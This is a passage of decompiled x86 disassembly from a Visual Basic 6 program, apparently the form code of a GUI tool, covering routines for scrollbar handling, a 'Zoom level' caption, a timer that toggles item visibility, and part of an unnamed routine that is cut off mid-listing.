0087FDA4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FDA9: mov var_00000198, eax
0087FDAF: jmp 87FDB8h
0087FDB1: and var_00000198, 00000000h
0087FDB8: movsx eax, word ptr var_000000A8
0087FDBF: mov ecx, [ebp+08h]
0087FDC2: mov ecx, [ecx+00000084h]
0087FDC8: imul ecx, eax
0087FDCB: jo 008802A5h
0087FDD1: mov var_0000019C, ecx
0087FDD7: fild dword ptr var_0000019C
0087FDDD: fstp real8 ptr var_000001A4
0087FDE3: fld real8 ptr var_000001A4
0087FDE9: cmp [008F2000h], 00000000h
0087FDF0: jnz 87FDFAh
0087FDF2: fdiv real8 ptr [00407150h]
0087FDF8: jmp 87FE0Bh
0087FDFA: push [00407154h]
0087FE00: push [00407150h]
0087FE06: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087FE0B: fstsw ax
0087FE0D: test al, 0Dh
0087FE0F: jnz 008802A0h
0087FE15: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087FE1A: mov ecx, [ebp+08h]
0087FE1D: mov [ecx+74h], eax
0087FE20: lea ecx, var_28
0087FE23: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087FE28: mov eax, [ebp+08h]
0087FE2B: add eax, 0000006Ch
0087FE2E: push eax
0087FE2F: mov eax, [ebp+08h]
0087FE32: add eax, 00000038h
0087FE35: push eax
0087FE36: push 00000010h
0087FE38: call 00410CCAh ; msvbvm60.dll.__vbaCopyBytes
0087FE3D: mov eax, [ebp+08h]
0087FE40: and word ptr [eax+48h], 0000h
0087FE45: mov eax, [ebp+08h]
0087FE48: mov eax, [eax]
0087FE4A: push [ebp+08h]
0087FE4D: call [eax+000002FCh]
0087FE53: push eax
0087FE54: lea eax, var_2C
0087FE57: push eax
0087FE58: call 00410A84h ; Set (object)
0087FE5D: mov var_000000B4, eax
0087FE63: mov eax, [ebp+08h]
0087FE66: mov eax, [eax]
0087FE68: push [ebp+08h]
0087FE6B: call [eax+0000032Ch]
0087FE71: push eax
0087FE72: lea eax, var_28
0087FE75: push eax
0087FE76: call 00410A84h ; Set (object)
0087FE7B: mov var_000000AC, eax
0087FE81: lea eax, var_000000A8
0087FE87: push eax
0087FE88: mov eax, var_000000AC
0087FE8E: mov eax, [eax]
0087FE90: push var_000000AC
0087FE96: call [eax+000000B8h]
0087FE9C: fclex 
0087FE9E: mov var_000000B0, eax
0087FEA4: cmp var_000000B0, 00000000h
0087FEAB: jnl 87FED0h
0087FEAD: push 000000B8h
0087FEB2: push 00457C24h
0087FEB7: push var_000000AC
0087FEBD: push var_000000B0
0087FEC3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FEC8: mov var_000001A8, eax
0087FECE: jmp 87FED7h
0087FED0: and var_000001A8, 00000000h
0087FED7: mov ax, var_000000A8
0087FEDE: neg ax
0087FEE1: movsx eax, ax
0087FEE4: mov var_000001AC, eax
0087FEEA: fild dword ptr var_000001AC
0087FEF0: fstp real4 ptr var_000001B0
0087FEF6: fld real4 ptr var_000001B0
0087FEFC: push ecx
0087FEFD: fstp real4 ptr [esp]
0087FF00: mov eax, var_000000B4
0087FF06: mov eax, [eax]
0087FF08: push var_000000B4
0087FF0E: call [eax+74h]
0087FF11: fclex 
0087FF13: mov var_000000B8, eax
0087FF19: cmp var_000000B8, 00000000h
0087FF20: jnl 87FF42h
0087FF22: push 00000074h
0087FF24: push 00440EDCh
0087FF29: push var_000000B4
0087FF2F: push var_000000B8
0087FF35: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FF3A: mov var_000001B4, eax
0087FF40: jmp 87FF49h
0087FF42: and var_000001B4, 00000000h
0087FF49: lea eax, var_2C
0087FF4C: push eax
0087FF4D: lea eax, var_28
0087FF50: push eax
0087FF51: push 00000002h
0087FF53: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087FF58: add esp, 0000000Ch
0087FF5B: mov eax, [ebp+08h]
0087FF5E: mov eax, [eax]
0087FF60: push [ebp+08h]
0087FF63: call [eax+000002FCh]
0087FF69: push eax
0087FF6A: lea eax, var_2C
0087FF6D: push eax
0087FF6E: call 00410A84h ; Set (object)
0087FF73: mov var_000000B4, eax
0087FF79: mov eax, [ebp+08h]
0087FF7C: mov eax, [eax]
0087FF7E: push [ebp+08h]
0087FF81: call [eax+00000330h]
0087FF87: push eax
0087FF88: lea eax, var_28
0087FF8B: push eax
0087FF8C: call 00410A84h ; Set (object)
0087FF91: mov var_000000AC, eax
0087FF97: lea eax, var_000000A8
0087FF9D: push eax
0087FF9E: mov eax, var_000000AC
0087FFA4: mov eax, [eax]
0087FFA6: push var_000000AC
0087FFAC: call [eax+000000B8h]
0087FFB2: fclex 
0087FFB4: mov var_000000B0, eax
0087FFBA: cmp var_000000B0, 00000000h
0087FFC1: jnl 87FFE6h
0087FFC3: push 000000B8h
0087FFC8: push 00457C34h
0087FFCD: push var_000000AC
0087FFD3: push var_000000B0
0087FFD9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FFDE: mov var_000001B8, eax
0087FFE4: jmp 87FFEDh
0087FFE6: and var_000001B8, 00000000h
0087FFED: mov ax, var_000000A8
0087FFF4: neg ax
0087FFF7: movsx eax, ax
0087FFFA: mov var_000001BC, eax
00880000: fild dword ptr var_000001BC
00880006: fstp real4 ptr var_000001C0
0088000C: fld real4 ptr var_000001C0
00880012: push ecx
00880013: fstp real4 ptr [esp]
00880016: mov eax, var_000000B4
0088001C: mov eax, [eax]
0088001E: push var_000000B4
00880024: call [eax+7Ch]
00880027: fclex 
00880029: mov var_000000B8, eax
0088002F: cmp var_000000B8, 00000000h
00880036: jnl 880058h
00880038: push 0000007Ch
0088003A: push 00440EDCh
0088003F: push var_000000B4
00880045: push var_000000B8
0088004B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880050: mov var_000001C4, eax
00880056: jmp 88005Fh
00880058: and var_000001C4, 00000000h
0088005F: lea eax, var_2C
00880062: push eax
00880063: lea eax, var_28
00880066: push eax
00880067: push 00000002h
00880069: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0088006E: add esp, 0000000Ch
00880071: mov eax, [ebp+08h]
00880074: mov eax, [eax]
00880076: push [ebp+08h]
00880079: call [eax+0000031Ch]
0088007F: push eax
00880080: lea eax, var_28
00880083: push eax
00880084: call 00410A84h ; Set (object)
00880089: mov var_000000AC, eax
0088008F: push 00000000h
00880091: mov eax, var_000000AC
00880097: mov eax, [eax]
00880099: push var_000000AC
0088009F: call [eax+54h]
008800A2: fclex 
008800A4: mov var_000000B0, eax
008800AA: cmp var_000000B0, 00000000h
008800B1: jnl 8800D3h
008800B3: push 00000054h
008800B5: push 004425E4h
008800BA: push var_000000AC
008800C0: push var_000000B0
008800C6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008800CB: mov var_000001C8, eax
008800D1: jmp 8800DAh
008800D3: and var_000001C8, 00000000h
008800DA: lea ecx, var_28
008800DD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008800E2: mov eax, [ebp+08h]
008800E5: mov eax, [eax]
008800E7: push [ebp+08h]
008800EA: call [eax+00000340h]
008800F0: push eax
008800F1: lea eax, var_28
008800F4: push eax
008800F5: call 00410A84h ; Set (object)
008800FA: mov var_000000AC, eax
00880100: push 00457C7Ch ; Zoom level:
00880105: mov eax, [ebp+08h]
00880108: push [eax+0000008Ch]
0088010E: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
00880113: mov edx, eax
00880115: lea ecx, var_20
00880118: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088011D: push eax
0088011E: call 00410A18h ; &
00880123: mov edx, eax
00880125: lea ecx, var_24
00880128: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088012D: push eax
0088012E: mov eax, var_000000AC
00880134: mov eax, [eax]
00880136: push var_000000AC
0088013C: call [eax+74h]
0088013F: fclex 
00880141: mov var_000000B0, eax
00880147: cmp var_000000B0, 00000000h
0088014E: jnl 880170h
00880150: push 00000074h
00880152: push 00447A20h
00880157: push var_000000AC
0088015D: push var_000000B0
00880163: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880168: mov var_000001CC, eax
0088016E: jmp 880177h
00880170: and var_000001CC, 00000000h
00880177: lea eax, var_24
0088017A: push eax
0088017B: lea eax, var_20
0088017E: push eax
0088017F: push 00000002h
00880181: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00880186: add esp, 0000000Ch
00880189: lea ecx, var_28
0088018C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880191: mov eax, [ebp+08h]
00880194: mov eax, [eax]
00880196: push [ebp+08h]
00880199: call [eax+00000340h]
0088019F: push eax
008801A0: lea eax, var_28
008801A3: push eax
008801A4: call 00410A84h ; Set (object)
008801A9: mov var_000000AC, eax
008801AF: push FFFFFFFFh
008801B1: mov eax, var_000000AC
008801B7: mov eax, [eax]
008801B9: push var_000000AC
008801BF: call [eax+5Ch]
008801C2: fclex 
008801C4: mov var_000000B0, eax
008801CA: cmp var_000000B0, 00000000h
008801D1: jnl 8801F3h
008801D3: push 0000005Ch
008801D5: push 00447A20h
008801DA: push var_000000AC
008801E0: push var_000000B0
008801E6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008801EB: mov var_000001D0, eax
008801F1: jmp 8801FAh
008801F3: and var_000001D0, 00000000h
008801FA: lea ecx, var_28
008801FD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880202: mov eax, [ebp+08h]
00880205: mov eax, [eax]
00880207: push [ebp+08h]
0088020A: call [eax+00000700h]
00880210: mov var_000000AC, eax
00880216: cmp var_000000AC, 00000000h
0088021D: jnl 88023Fh
0088021F: push 00000700h
00880224: push 00441844h
00880229: push [ebp+08h]
0088022C: push var_000000AC
00880232: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880237: mov var_000001D4, eax
0088023D: jmp 880246h
0088023F: and var_000001D4, 00000000h
00880246: call 004109C4h ; msvbvm60.dll.__vbaExitProc
0088024B: wait 
0088024C: push 00880281h
00880251: jmp 880280h
00880253: lea eax, var_24
00880256: push eax
00880257: lea eax, var_20
0088025A: push eax
0088025B: push 00000002h
0088025D: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00880262: add esp, 0000000Ch
00880265: lea eax, var_34
00880268: push eax
00880269: lea eax, var_30
0088026C: push eax
0088026D: lea eax, var_2C
00880270: push eax
00880271: lea eax, var_28
00880274: push eax
00880275: push 00000004h
00880277: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0088027C: add esp, 00000014h
0088027F: ret 
End Sub

Private sub scrVertical__87EF02
0087EF02: push ebp
0087EF03: mov ebp, esp
0087EF05: sub esp, 0000000Ch
0087EF08: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087EF0D: mov eax, fs:[00h]
0087EF13: push eax
0087EF14: mov fs:[00000000h], esp
0087EF1B: push 00000034h
0087EF1D: pop eax
0087EF1E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087EF23: push ebx
0087EF24: push esi
0087EF25: push edi
0087EF26: mov var_0C, esp
0087EF29: mov var_08, 0040D998h
0087EF30: mov eax, [ebp+08h]
0087EF33: and eax, 00000001h
0087EF36: mov var_04, eax
0087EF39: mov eax, [ebp+08h]
0087EF3C: and al, FEh
0087EF3E: mov [ebp+08h], eax
0087EF41: mov eax, [ebp+08h]
0087EF44: mov eax, [eax]
0087EF46: push [ebp+08h]
0087EF49: call [eax+04h]
0087EF4C: mov eax, [ebp+08h]
0087EF4F: mov eax, [eax]
0087EF51: push [ebp+08h]
0087EF54: call [eax+000002FCh]
0087EF5A: push eax
0087EF5B: lea eax, var_1C
0087EF5E: push eax
0087EF5F: call 00410A84h ; Set (object)
0087EF64: mov var_2C, eax
0087EF67: mov eax, [ebp+08h]
0087EF6A: mov eax, [eax]
0087EF6C: push [ebp+08h]
0087EF6F: call [eax+0000032Ch]
0087EF75: push eax
0087EF76: lea eax, var_18
0087EF79: push eax
0087EF7A: call 00410A84h ; Set (object)
0087EF7F: mov var_24, eax
0087EF82: lea eax, var_20
0087EF85: push eax
0087EF86: mov eax, var_24
0087EF89: mov eax, [eax]
0087EF8B: push var_24
0087EF8E: call [eax+000000B8h]
0087EF94: fclex 
0087EF96: mov var_28, eax
0087EF99: cmp var_28, 00000000h
0087EF9D: jnl 87EFB9h
0087EF9F: push 000000B8h
0087EFA4: push 00457C24h
0087EFA9: push var_24
0087EFAC: push var_28
0087EFAF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EFB4: mov var_3C, eax
0087EFB7: jmp 87EFBDh
0087EFB9: and var_3C, 00000000h
0087EFBD: mov ax, var_20
0087EFC1: neg ax
0087EFC4: movsx eax, ax
0087EFC7: mov var_40, eax
0087EFCA: fild dword ptr var_40
0087EFCD: fstp real4 ptr var_44
0087EFD0: fld real4 ptr var_44
0087EFD3: push ecx
0087EFD4: fstp real4 ptr [esp]
0087EFD7: mov eax, var_2C
0087EFDA: mov eax, [eax]
0087EFDC: push var_2C
0087EFDF: call [eax+74h]
0087EFE2: fclex 
0087EFE4: mov var_30, eax
0087EFE7: cmp var_30, 00000000h
0087EFEB: jnl 87F004h
0087EFED: push 00000074h
0087EFEF: push 00440EDCh
0087EFF4: push var_2C
0087EFF7: push var_30
0087EFFA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087EFFF: mov var_48, eax
0087F002: jmp 87F008h
0087F004: and var_48, 00000000h
0087F008: lea eax, var_1C
0087F00B: push eax
0087F00C: lea eax, var_18
0087F00F: push eax
0087F010: push 00000002h
0087F012: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087F017: add esp, 0000000Ch
0087F01A: mov var_04, 00000000h
0087F021: wait 
0087F022: push 0087F03Dh
0087F027: jmp 87F03Ch
0087F029: lea eax, var_1C
0087F02C: push eax
0087F02D: lea eax, var_18
0087F030: push eax
0087F031: push 00000002h
0087F033: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087F038: add esp, 0000000Ch
0087F03B: ret 
End Sub

Private sub tmrSelBots__880F99
00880F99: push ebp
00880F9A: mov ebp, esp
00880F9C: sub esp, 00000018h
00880F9F: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00880FA4: mov eax, fs:[00h]
00880FAA: push eax
00880FAB: mov fs:[00000000h], esp
00880FB2: mov eax, 000000BCh
00880FB7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00880FBC: push ebx
00880FBD: push esi
00880FBE: push edi
00880FBF: mov var_18, esp
00880FC2: mov var_14, 0040DA70h
00880FC9: mov eax, [ebp+08h]
00880FCC: and eax, 00000001h
00880FCF: mov var_10, eax
00880FD2: mov eax, [ebp+08h]
00880FD5: and al, FEh
00880FD7: mov [ebp+08h], eax
00880FDA: mov var_0C, 00000000h
00880FE1: mov eax, [ebp+08h]
00880FE4: mov eax, [eax]
00880FE6: push [ebp+08h]
00880FE9: call [eax+04h]
00880FEC: mov var_04, 00000001h
00880FF3: mov var_04, 00000002h
00880FFA: push FFFFFFFFh
00880FFC: call 00410A60h ; On Error ...
00881001: mov var_04, 00000003h
00881008: mov eax, [ebp+08h]
0088100B: cmp [eax+000000A0h], 00000000h
00881012: jnz 881037h
00881014: mov eax, [ebp+08h]
00881017: add eax, 000000A0h
0088101C: push eax
0088101D: push 00440E38h
00881022: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00881027: mov eax, [ebp+08h]
0088102A: add eax, 000000A0h
0088102F: mov var_000000C8, eax
00881035: jmp 881045h
00881037: mov eax, [ebp+08h]
0088103A: add eax, 000000A0h
0088103F: mov var_000000C8, eax
00881045: mov eax, var_000000C8
0088104B: mov eax, [eax]
0088104D: mov var_0000009C, eax
00881053: lea eax, var_00000098
00881059: push eax
0088105A: mov eax, var_0000009C
00881060: mov eax, [eax]
00881062: push var_0000009C
00881068: call [eax+24h]
0088106B: fclex 
0088106D: mov var_000000A0, eax
00881073: cmp var_000000A0, 00000000h
0088107A: jnl 88109Ch
0088107C: push 00000024h
0088107E: push 00440E28h
00881083: push var_0000009C
00881089: push var_000000A0
0088108F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881094: mov var_000000CC, eax
0088109A: jmp 8810A3h
0088109C: and var_000000CC, 00000000h
008810A3: mov eax, var_00000098
008810A9: mov var_000000B0, eax
008810AF: mov var_000000AC, 00000001h
008810B9: mov var_24, 00000001h
008810C0: jmp 8810D4h
008810C2: mov eax, var_24
008810C5: add eax, var_000000AC
008810CB: jo 008812ECh
008810D1: mov var_24, eax
008810D4: mov eax, var_24
008810D7: cmp eax, var_000000B0
008810DD: jnle 008812A3h
008810E3: mov var_04, 00000004h
008810EA: mov eax, [ebp+08h]
008810ED: cmp [eax+000000A0h], 00000000h
008810F4: jnz 881119h
008810F6: mov eax, [ebp+08h]
008810F9: add eax, 000000A0h
008810FE: push eax
008810FF: push 00440E38h
00881104: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00881109: mov eax, [ebp+08h]
0088110C: add eax, 000000A0h
00881111: mov var_000000D0, eax
00881117: jmp 881127h
00881119: mov eax, [ebp+08h]
0088111C: add eax, 000000A0h
00881121: mov var_000000D0, eax
00881127: mov eax, var_000000D0
0088112D: mov eax, [eax]
0088112F: mov var_000000A4, eax
00881135: lea eax, var_24
00881138: mov var_6C, eax
0088113B: mov var_74, 00004003h
00881142: lea eax, var_34
00881145: push eax
00881146: lea eax, var_74
00881149: push eax
0088114A: mov eax, var_000000A4
00881150: mov eax, [eax]
00881152: push var_000000A4
00881158: call [eax+1Ch]
0088115B: fclex 
0088115D: mov var_000000A8, eax
00881163: cmp var_000000A8, 00000000h
0088116A: jnl 88118Ch
0088116C: push 0000001Ch
0088116E: push 00440E28h
00881173: push var_000000A4
00881179: push var_000000A8
0088117F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881184: mov var_000000D4, eax
0088118A: jmp 881193h
0088118C: and var_000000D4, 00000000h
00881193: mov eax, [ebp+08h]
00881196: cmp [eax+000000A0h], 00000000h
0088119D: jnz 8811C2h
0088119F: mov eax, [ebp+08h]
008811A2: add eax, 000000A0h
008811A7: push eax
008811A8: push 00440E38h
008811AD: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008811B2: mov eax, [ebp+08h]
008811B5: add eax, 000000A0h
008811BA: mov var_000000D8, eax
008811C0: jmp 8811D0h
008811C2: mov eax, [ebp+08h]
008811C5: add eax, 000000A0h
008811CA: mov var_000000D8, eax
008811D0: mov eax, var_000000D8
008811D6: mov eax, [eax]
008811D8: mov var_0000009C, eax
008811DE: lea eax, var_24
008811E1: mov var_7C, eax
008811E4: mov var_00000084, 00004003h
008811EE: lea eax, var_64
008811F1: push eax
008811F2: lea eax, var_00000084
008811F8: push eax
008811F9: mov eax, var_0000009C
008811FF: mov eax, [eax]
00881201: push var_0000009C
00881207: call [eax+1Ch]
0088120A: fclex 
0088120C: mov var_000000A0, eax
00881212: cmp var_000000A0, 00000000h
00881219: jnl 88123Bh
0088121B: push 0000001Ch
0088121D: push 00440E28h
00881222: push var_0000009C
00881228: push var_000000A0
0088122E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881233: mov var_000000DC, eax
00881239: jmp 881242h
0088123B: and var_000000DC, 00000000h
00881242: push 00000000h
00881244: push 00457C44h ; Visible
00881249: lea eax, var_34
0088124C: push eax
0088124D: lea eax, var_44
00881250: push eax
00881251: call 004107D8h ; msvbvm60.dll.__vbaVarLateMemCallLd
00881256: add esp, 00000010h
00881259: push eax
0088125A: lea eax, var_54
0088125D: push eax
0088125E: call 00410C88h ; Not
00881263: mov esi, eax
00881265: push 00000010h
00881267: pop eax
00881268: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088126D: mov edi, esp
0088126F: movsd 
00881270: movsd 
00881271: movsd 
00881272: movsd 
00881273: push 00457C44h ; Visible
00881278: lea eax, var_64
0088127B: push eax
0088127C: call 0041087Ah ; msvbvm60.dll.__vbaVarLateMemSt
00881281: lea eax, var_64
00881284: push eax
00881285: lea eax, var_44
00881288: push eax
00881289: lea eax, var_34
0088128C: push eax
0088128D: push 00000003h
0088128F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00881294: add esp, 00000010h
00881297: mov var_04, 00000005h
0088129E: jmp 008810C2h
008812A3: mov var_10, 00000000h
008812AA: push 008812CDh
008812AF: jmp 8812CCh
008812B1: lea eax, var_64
008812B4: push eax
008812B5: lea eax, var_54
008812B8: push eax
008812B9: lea eax, var_44
008812BC: push eax
008812BD: lea eax, var_34
008812C0: push eax
008812C1: push 00000004h
008812C3: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008812C8: add esp, 00000014h
008812CB: ret 
End Sub

Private sub unknown_881E0B
00881E0B: push ebp
00881E0C: mov ebp, esp
00881E0E: sub esp, 00000018h
00881E11: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00881E16: mov eax, fs:[00h]
00881E1C: push eax
00881E1D: mov fs:[00000000h], esp
00881E24: mov eax, 00000244h
00881E29: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00881E2E: push ebx
00881E2F: push esi
00881E30: push edi
00881E31: mov var_18, esp
00881E34: mov var_14, 0040DAC8h
00881E3B: mov var_10, 00000000h
00881E42: mov var_0C, 00000000h
00881E49: mov eax, [ebp+08h]
00881E4C: mov eax, [eax]
00881E4E: push [ebp+08h]
00881E51: call [eax+04h]
00881E54: mov var_04, 00000001h
00881E5B: mov edx, [ebp+10h]
00881E5E: lea ecx, var_30
00881E61: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00881E66: mov var_04, 00000002h
00881E6D: push FFFFFFFFh
00881E6F: call 00410A60h ; On Error ...
00881E74: mov var_04, 00000003h
00881E7B: mov eax, [ebp+08h]
00881E7E: mov eax, [eax]
00881E80: push [ebp+08h]
00881E83: call [eax+000002FCh]
00881E89: push eax
00881E8A: lea eax, var_34
00881E8D: push eax
00881E8E: call 00410A84h ; Set (object)
00881E93: mov var_000000DC, eax
00881E99: lea eax, var_000000D8
00881E9F: push eax
00881EA0: mov eax, var_000000DC
00881EA6: mov eax, [eax]
00881EA8: push var_000000DC
00881EAE: call [eax+00000080h]
00881EB4: fclex 
00881EB6: mov var_000000E0, eax
00881EBC: cmp var_000000E0, 00000000h
00881EC3: jnl 881EE8h
00881EC5: push 00000080h
00881ECA: push 00440EDCh
00881ECF: push var_000000DC
00881ED5: push var_000000E0
00881EDB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881EE0: mov var_00000118, eax
00881EE6: jmp 881EEFh
00881EE8: and var_00000118, 00000000h
00881EEF: fld real4 ptr var_000000D8
00881EF5: cmp [008F2000h], 00000000h
00881EFC: jnz 881F06h
00881EFE: fdiv real4 ptr [00402B64h]
00881F04: jmp 881F11h
00881F06: push [00402B64h]
00881F0C: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00881F11: fstsw ax
00881F13: test al, 0Dh
00881F15: jnz 00883DADh
00881F1B: call 00410814h ; msvbvm60.dll.__vbaFpI4
00881F20: mov var_28, eax
00881F23: lea ecx, var_34
00881F26: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00881F2B: mov var_04, 00000004h
00881F32: mov eax, [ebp+08h]
00881F35: mov eax, [eax]
00881F37: push [ebp+08h]
00881F3A: call [eax+000002FCh]
00881F40: push eax
00881F41: lea eax, var_34
00881F44: push eax
00881F45: call 00410A84h ; Set (object)
00881F4A: mov var_000000DC, eax
00881F50: lea eax, var_000000D8
00881F56: push eax
00881F57: mov eax, var_000000DC
00881F5D: mov eax, [eax]
00881F5F: push var_000000DC
00881F65: call [eax+00000088h]
00881F6B: fclex 
00881F6D: mov var_000000E0, eax
00881F73: cmp var_000000E0, 00000000h
00881F7A: jnl 881F9Fh
00881F7C: push 00000088h
00881F81: push 00440EDCh
00881F86: push var_000000DC
00881F8C: push var_000000E0
00881F92: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881F97: mov var_0000011C, eax
00881F9D: jmp 881FA6h
00881F9F: and var_0000011C, 00000000h
00881FA6: fld real4 ptr var_000000D8
00881FAC: cmp [008F2000h], 00000000h
00881FB3: jnz 881FBDh
00881FB5: fdiv real4 ptr [00402B64h]
00881FBB: jmp 881FC8h
00881FBD: push [00402B64h]
00881FC3: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00881FC8: fstsw ax
00881FCA: test al, 0Dh
00881FCC: jnz 00883DADh
00881FD2: call 00410814h ; msvbvm60.dll.__vbaFpI4
00881FD7: mov var_24, eax
00881FDA: lea ecx, var_34
00881FDD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00881FE2: mov var_04, 00000005h
00881FE9: mov eax, [ebp+0Ch]
00881FEC: mov var_000000F4, eax
00881FF2: mov eax, var_000000F4
00881FF8: mov var_00000120, eax
00881FFE: cmp var_00000120, 00000001h
00882005: jz 88201Eh
00882007: cmp var_00000120, 00000002h
0088200E: jz 00883393h
00882014: jmp 00883D52h
00882019: jmp 00883D52h
0088201E: mov var_04, 00000007h
00882025: mov eax, [ebp+20h]
00882028: cmp [eax], 00000000h
0088202B: jnz 008820C7h
00882031: mov var_04, 00000008h
00882038: mov eax, [ebp+08h]
0088203B: mov eax, [eax]
0088203D: push [ebp+08h]
00882040: call [eax+00000308h]
00882046: push eax
00882047: lea eax, var_34
0088204A: push eax
0088204B: call 00410A84h ; Set (object)
00882050: mov var_000000DC, eax
00882056: lea eax, var_000000D4
0088205C: push eax
0088205D: mov eax, var_000000DC
00882063: mov eax, [eax]
00882065: push var_000000DC
0088206B: call [eax+48h]
0088206E: fclex 
00882070: mov var_000000E0, eax
00882076: cmp var_000000E0, 00000000h
0088207D: jnl 88209Fh
0088207F: push 00000048h
00882081: push 00440DE8h
00882086: push var_000000DC
0088208C: push var_000000E0
00882092: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882097: mov var_00000124, eax
0088209D: jmp 8820A6h
0088209F: and var_00000124, 00000000h
008820A6: mov ax, var_000000D4
008820AD: add ax, 0001h
008820B1: jo 00883DB2h
008820B7: movsx eax, ax
008820BA: mov ecx, [ebp+20h]
008820BD: mov [ecx], eax
008820BF: lea ecx, var_34
008820C2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008820C7: mov var_04, 0000000Ah
008820CE: cmp [008F529Ch], 00000000h
008820D5: jnz 8820F2h
008820D7: push 008F529Ch
008820DC: push 00440F2Ch
008820E1: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008820E6: mov var_00000128, 008F529Ch
008820F0: jmp 8820FCh
008820F2: mov var_00000128, 008F529Ch
008820FC: mov eax, var_00000128
00882102: mov eax, [eax]
00882104: mov var_000000E4, eax
0088210A: mov eax, [ebp+08h]
0088210D: mov eax, [eax]
0088210F: push [ebp+08h]
00882112: call [eax+00000308h]
00882118: push eax
00882119: lea eax, var_34
0088211C: push eax
0088211D: call 00410A84h ; Set (object)
00882122: mov var_000000DC, eax
00882128: lea eax, var_38
0088212B: push eax
0088212C: mov eax, [ebp+20h]
0088212F: mov ecx, [eax]
00882131: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882136: push eax
00882137: mov eax, var_000000DC
0088213D: mov eax, [eax]
0088213F: push var_000000DC
00882145: call [eax+40h]
00882148: fclex 
0088214A: mov var_000000E0, eax
00882150: cmp var_000000E0, 00000000h
00882157: jnl 882179h
00882159: push 00000040h
0088215B: push 00440DE8h
00882160: push var_000000DC
00882166: push var_000000E0
0088216C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882171: mov var_0000012C, eax
00882177: jmp 882180h
00882179: and var_0000012C, 00000000h
00882180: mov eax, var_38
00882183: mov var_0000010C, eax
00882189: and var_38, 00000000h
0088218D: push var_0000010C
00882193: lea eax, var_3C
00882196: push eax
00882197: call 00410A84h ; Set (object)
0088219C: push eax
0088219D: mov eax, var_000000E4
008821A3: mov eax, [eax]
008821A5: push var_000000E4
008821AB: call [eax+0Ch]
008821AE: fclex 
008821B0: mov var_000000E8, eax
008821B6: cmp var_000000E8, 00000000h
008821BD: jnl 8821DFh
008821BF: push 0000000Ch
008821C1: push 00440F1Ch
008821C6: push var_000000E4
008821CC: push var_000000E8
008821D2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008821D7: mov var_00000130, eax
008821DD: jmp 8821E6h
008821DF: and var_00000130, 00000000h
008821E6: lea eax, var_3C
008821E9: push eax
008821EA: lea eax, var_34
008821ED: push eax
008821EE: push 00000002h
008821F0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008821F5: add esp, 0000000Ch
008821F8: mov var_04, 0000000Bh
008821FF: cmp [008F529Ch], 00000000h
00882206: jnz 882223h
00882208: push 008F529Ch
0088220D: push 00440F2Ch
00882212: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00882217: mov var_00000134, 008F529Ch
00882221: jmp 88222Dh
00882223: mov var_00000134, 008F529Ch
0088222D: mov eax, var_00000134
00882233: mov eax, [eax]
00882235: mov var_000000E4, eax
0088223B: mov eax, [ebp+08h]
0088223E: mov eax, [eax]
00882240: push [ebp+08h]
00882243: call [eax+00000314h]
00882249: push eax
0088224A: lea eax, var_34
0088224D: push eax
0088224E: call 00410A84h ; Set (object)
00882253: mov var_000000DC, eax
00882259: lea eax, var_38
0088225C: push eax
0088225D: mov eax, [ebp+20h]
00882260: mov ecx, [eax]
00882262: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882267: push eax
00882268: mov eax, var_000000DC
